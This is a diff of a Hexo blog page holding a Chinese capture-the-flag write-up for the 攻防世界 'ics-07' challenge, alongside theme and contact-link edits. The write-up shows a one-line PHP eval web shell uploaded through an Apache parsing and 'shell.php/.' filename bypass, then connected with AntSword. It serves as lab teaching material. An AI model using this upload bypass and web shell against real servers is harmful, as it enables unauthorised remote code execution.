@@ -19,10 +19,20 @@
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="format-detection" content="telephone=no">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-BYTY196ENH');
+    </script>
 
 
     <title>攻防世界-ics-07 | hybcx&#39;s blog</title>
@@ -268,7 +278,7 @@
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -325,7 +335,7 @@
     }
 </style>
 
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -420,11 +430,6 @@
                 
 
                 
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
             </div>
         </div>
         <hr class="clearfix">
@@ -441,9 +446,9 @@
                 <h2 id="题目描述：">题目描述：</h2>
 <p>工控云管理系统项目管理页面解析漏洞</p>
 <h2 id="题目解题：">题目解题：</h2>
-<p><img src="/2023/08/24/ics-07/image-20230824152504884.png" alt="image-20230824152504884"></p>
+<p><img src="image-20230824152504884.png" alt="image-20230824152504884"></p>
 <p>熟悉的页面，我们还是点击测试，发现只有项目管理可以点击</p>
-<p><img src="/2023/08/24/ics-07/image-20230824152530438.png" alt="image-20230824152530438"></p>
+<p><img src="image-20230824152530438.png" alt="image-20230824152530438"></p>
 <p>页面如图所示，这里左下角有个view-source，我们审一下源码</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
     <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建新会话，或重用现有会话（cookie提交会话id时）</span>
@@ -517,25 +522,25 @@
 <span class="token keyword">print</span> <span class="token variable">$float_value_of_var</span><span class="token punctuation">;</span> <span class="token comment">// 打印出 122.34343</span>
 <span class="token delimiter important">?&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>因此可以将id赋值为1a9</p>
-<p><img src="/2023/08/24/ics-07/image-20230824153333827.png" alt="image-20230824153333827"></p>
+<p><img src="image-20230824153333827.png" alt="image-20230824153333827"></p>
 <p>页面有所回显，此刻我们便可以进行文件上传，上传时先来看看如何绕过正则，结合题目信息，这里说是有文件解析漏洞，那我们应当找一下该项目是由哪个中间件写的</p>
-<p><img src="/2023/08/24/ics-07/image-20230824153445506.png" alt="image-20230824153445506"></p>
+<p><img src="image-20230824153445506.png" alt="image-20230824153445506"></p>
 <p>这就好办了。</p>
 <h3 id="Apache解析漏洞">Apache解析漏洞</h3>
 <p>原理： Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。比如test.php.a.b的“.a”和“.b”这两种后缀是apache不能识别解析，apache就会把test.php.a.b解析成test.php。</p>
-<p><img src="/2023/08/24/ics-07/image-20230824153738641.png" alt="image-20230824153738641"></p>
+<p><img src="image-20230824153738641.png" alt="image-20230824153738641"></p>
 <p>上传成功以后，页面并不会有任何回显，需要输入$con的上传网址查看自己的文件</p>
-<p><img src="/2023/08/24/ics-07/image-20230824153844351.png" alt="image-20230824153844351"></p>
+<p><img src="image-20230824153844351.png" alt="image-20230824153844351"></p>
 <p>但似乎这里并没有被当做php解析，蚁剑连接不上去，看了wp发现payload如下</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">con=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>&amp;file=shell.php/.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/08/24/ics-07/image-20230824154412109.png" alt="image-20230824154412109"></p>
+<p><img src="image-20230824154412109.png" alt="image-20230824154412109"></p>
 <p>这回成功解析为php，蚁剑也成功连接</p>
-<p><img src="/2023/08/24/ics-07/image-20230824154505958.png" alt="image-20230824154505958"></p>
+<p><img src="image-20230824154505958.png" alt="image-20230824154505958"></p>
 <p>拿到flag</p>
-<p><img src="/2023/08/24/ics-07/image-20230824154541281.png" alt="image-20230824154541281"></p>
+<p><img src="image-20230824154541281.png" alt="image-20230824154541281"></p>
 <h2 id="总结">总结</h2>
 <p>php的解释器可以解析：php、php3、php4、php5、php7、phtml、pht、phs、shtml、pwml，不过本题都对此过滤了。</p>
-<p><img src="/2023/08/24/ics-07/image-20230824154822621.png" alt="image-20230824154822621"></p>
+<p><img src="image-20230824154822621.png" alt="image-20230824154822621"></p>
 <p>也有大佬根据apache2.x的解析漏洞，补充了不可识别的文件格式~例如1.php.1（有大佬以截断形式输入，1.php/.，上传后显示为1.php）</p>
 <pre class="line-numbers language-none"><code class="language-none">绕过方式`../filename.php/.`或者`filename.php/.`
 
@@ -634,7 +639,7 @@
     <div id="rewardModal" class="modal">
         <div class="modal-content">
             <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <h4 class="reward-title">随缘，看各位佬的心情</h4>
             <div class="reward-content">
                 <div class="reward-tabs">
                     <ul class="tabs row">
@@ -642,7 +647,7 @@
                         <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                     </ul>
                     <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                     </div>
                     <div id="wechat">
                         <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
@@ -922,12 +927,12 @@
 <script>
     new Valine({
         el: '#vcomments',
-        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
-        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
-        serverURLs: '',
+        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
+        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
+        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
         notify: 'false' === 'true',
         verify: 'false' === 'true',
-        visitor: 'true' === 'true',
+        visitor: 'false' === 'true',
         avatar: 'mm',
         pageSize: '10',
         lang: 'zh-cn',
@@ -1064,6 +1069,8 @@
 
 <!-- 代码块收缩 -->
 
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
 
 
     </div>
@@ -1091,8 +1098,8 @@
             tocSelector: '#toc-content',
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            collapseDepth: Number('3'),
+            headingSelector: 'h2, h3, h4, h5, h6'
         });
 
         // Set scroll toc fixed.
@@ -1175,8 +1182,6 @@
             
             
             
-                
-            
             
                 <span id="busuanzi_container_site_pv">
                 &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
@@ -1196,24 +1201,28 @@
             <br>
             
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
         <i class="fab fa-github"></i>
     </a>
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
+        <i class="fab fa-facebook-f"></i>
     </a>
 
 
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
         <i class="fab fa-qq"></i>
     </a>
 
@@ -1425,8 +1434,6 @@ $(function () {
     
     <script src="/libs/others/clicklove.js" async="async"></script>
     
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
     
 
     
